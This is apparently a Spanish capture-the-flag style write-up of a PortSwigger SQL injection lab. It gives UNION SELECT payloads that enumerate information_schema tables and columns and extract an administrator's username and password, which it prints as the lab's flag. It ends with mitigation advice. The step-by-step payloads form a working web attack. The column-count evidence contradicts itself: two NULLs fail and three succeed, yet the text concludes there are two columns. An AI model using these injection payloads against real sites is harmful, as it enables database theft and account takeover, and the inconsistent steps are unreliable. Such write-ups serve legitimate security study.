---
title: "Ataque de inyección SQL, listando el contenido de bases de datos en bases de datos que no son Oracle"
platform: "PortSwigger"
os: "Linux"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "ataque-de-inyeccion-sql-listando-el-contenido-de-bases-de-datos-en-bases-de-datos-que-no-son-oracle"
author: "Z4k7"
date: "2026-03-01"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "union"
  - "information_schema"
  - "practitioner"
techniques:
  - "SQL Injection"
  - "UNION attack"
  - "information_schema"
  - "enumeración de tablas y columnas"
  - "extracción de credenciales"
tools:
  - "BurpSuite"
flags_list:
  - label: "administrador"
    value: "administrator"
  - label: "password"
    value: "mtnm9c067t0tgxfjo926"
summary: "La vulnerabilidad de SQL Injection en el filtro de categorías permite enumerar la estructura completa de la BD y extraer credenciales sin conocer los nombres de tablas de antemano. Este lab introduce information_schema — la vista de metadatos universal en BD no-Oracle. Cadena de ataque: detección → conteo columnas → ambas columnas string → listar tablas (users_hhpqlr) → listar columnas → extraer credenciales → login como admin.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma que la entrada se concatena directamente en la consulta SQL:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101332327.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El error de sintaxis demuestra que la entrada del usuario se inserta sin sanitización en la consulta SQL."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El reconocimiento también revela que no es Oracle (no hay prefijo `ORA-` en el error) y `--` funciona sin necesidad de `FROM dual`. Eso te orienta directamente a usar `information_schema` para la enumeración."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2--   → Éxito
          '+ORDER+BY+1,2,3-- → Error
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101439728.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo en la tercera prueba confirma que la consulta devuelve 2 columnas."
      - kind: "note"
        text: |
          Validación con UNION SELECT NULL:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL--         → Error
          ' UNION SELECT NULL,NULL--    → Error
          ' UNION SELECT NULL,NULL,NULL-- → Éxito ✓
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101552231.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se confirma que la consulta requiere 2 columnas para que el UNION sea válido."
      - kind: "note"
        text: |
          Identificación de columnas compatibles con strings:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT 'a',NULL-- → Éxito ✓
          ' UNION SELECT NULL,'a'-- → Éxito ✓
          ' UNION SELECT 'a','a'--  → Éxito ✓
      - kind: "note"
        text: |
          Ambas columnas aceptan strings — podemos extraer datos en las dos posiciones.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Tener ambas columnas como string es el escenario ideal para enumerar `information_schema` — puedes poner `table_name` en una columna y un placeholder en la otra, o concatenar si necesitas más info por fila."

  - id: "step3"
    num: "03"
    title: "Paso 1 — Listar tablas con information_schema"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT table_name,NULL FROM information_schema.tables--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101816421.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Filtrando los resultados, la tabla más relevante es `users_hhpqlr` — nombre ofuscado pero claramente la tabla de usuarios."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En entornos reales las tablas suelen tener sufijos aleatorios como medida anti-SQLi superficial — no ayuda, `information_schema` las lista todas igual. Filtra con `WHERE table_schema=database()` para quedarte solo con las tablas de la aplicación y no las del sistema."

  - id: "enum"
    num: "04"
    title: "Paso 2 — Listar columnas de la tabla objetivo"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_hhpqlr'--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310101942765.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Columnas encontradas:
      - kind: "bullet"
        text: "username_cejihr"
      - kind: "bullet"
        text: "email"
      - kind: "bullet"
        text: "password_eywsze"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Las columnas también tienen sufijos aleatorios. Identifícalas por semántica (`username_*`, `password_*`) no por nombre exacto. Documenta siempre el nombre exacto encontrado — es evidencia forense en el reporte."

  - id: "access_1"
    num: "05"
    title: "Paso 3 — Extracción de credenciales"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT username_cejihr, password_eywsze FROM users_hhpqlr--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310102055725.jpg"
        caption: "Evidencia técnica"

  - id: "exploit"
    num: "06"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Credenciales extraídas via enumeración completa de `information_schema`. Login exitoso como administrator.
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20bases%20de%20datos%20en%20bases%20de%20datos%20que%20no%20son%20Oracle/file-20260310102417552.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "administrador"
        value: "administrator"
      - label: "password"
        value: "mtnm9c067t0tgxfjo926"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          ---

  - id: "privesc_1"
    num: "07"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

  - id: "step8_1"
    num: "08"
    title: "Listado del contenido de la base de datos"
    content:
      - kind: "note"
        text: |
          La mayoría de los tipos de bases de datos (excepto Oracle) tienen `information_schema`:
      - kind: "code"
        lang: "SQL"
        code: |
          -- Listar tablas
          SELECT table_name FROM information_schema.tables WHERE table_schema=database()
          
          -- Listar columnas de una tabla
          SELECT column_name FROM information_schema.columns WHERE table_name='nombre_tabla'
      - kind: "callout"
        type: "danger"
        label: "SQL ERROR esperado al probar columnas"
        text: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."

lessons:
  - 'Siempre validar número de columnas con `ORDER BY`.'
  - 'Identificar columnas compatibles con datos de cadena para exfiltración.'
  - '`information_schema` es la puerta de entrada para enumerar tablas y columnas en BD no-Oracle.'
  - 'En auditorías reales, documentar cada paso con capturas y evidencias fortalece el reporte.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Restringir acceso a `information_schema` para usuarios de aplicación.'
  - 'Aplicar WAF con reglas específicas para detectar `UNION SELECT`.'
  - 'Validar y sanitizar entradas de usuario antes de construir consultas.'
  - 'Configurar principio de mínimo privilegio en la base de datos.'
---
